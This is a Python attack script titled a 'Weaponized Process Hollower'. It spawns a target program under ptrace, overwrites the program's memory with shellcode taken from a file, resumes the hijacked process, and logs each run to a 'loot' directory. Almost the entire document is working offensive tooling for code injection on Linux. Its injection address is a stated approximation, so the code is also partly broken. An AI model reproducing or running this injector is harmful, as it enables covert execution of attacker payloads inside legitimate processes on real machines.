import ctypes
import os
import sys
import time

def hollow_and_inject(target_bin, shellcode_path):
    """
    Weaponized Process Hollower: Spawns a target process, seizes it 
    via ptrace, and overwrites its text segment with raw shellcode.
    """
    libc = ctypes.CDLL("libc.so.6")
    
    # Constants for ptrace (Linux x86_64/ARM64)
    PTRACE_TRACEME = 0
    PTRACE_POKETEXT = 4
    PTRACE_CONT = 7
    PTRACE_GETREGS = 12
    PTRACE_SETREGS = 13

    if not os.path.exists(shellcode_path):
        print(f"[-] Shellcode not found: {shellcode_path}")
        return

    with open(shellcode_path, "rb") as f:
        shellcode = f.read()

    print(f"[*] Initializing Hollowing: {target_bin}")
    
    pid = os.fork()

    if pid == 0:
        # CHILD PROCESS: Request to be traced and then execute the target
        libc.ptrace(PTRACE_TRACEME, 0, 0, 0)
        os.execv(target_bin, [target_bin])
    else:
        # PARENT PROCESS: Wait for child to stop at the first instruction
        os.waitpid(pid, 0)
        print(f"[!] Target PID {pid} seized. Injecting {len(shellcode)} bytes...")

        # Inject shellcode 8 bytes at a time (PTRACE_POKETEXT limitation)
        for i in range(0, len(shellcode), 8):
            chunk = shellcode[i:i+8]
            # Pad the last chunk if it's less than 8 bytes
            if len(chunk) < 8:
                chunk = chunk.ljust(8, b'\x90') # NOP padding
            
            val = int.from_bytes(chunk, 'little')
            # Injecting at the current instruction pointer (approximated here as offset 0)
            # In a full-fidelity build, we would parse ELF headers to find the Entry Point
            libc.ptrace(PTRACE_POKETEXT, pid, i, val)

        print(f"[!] Injection complete. Resuming hijacked process...")
        libc.ptrace(PTRACE_CONT, pid, 0, 0)
        
        # Log the hijack
        with open("../loot/hollow_history.log", "a") as log:
            log.write(f"Target: {target_bin} | PID: {pid} | Payload: {shellcode_path}\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 142_process_hollower <target_bin_path> <shellcode_bin_path>")
        sys.exit(1)
    
    hollow_and_inject(sys.argv[1], sys.argv[2])
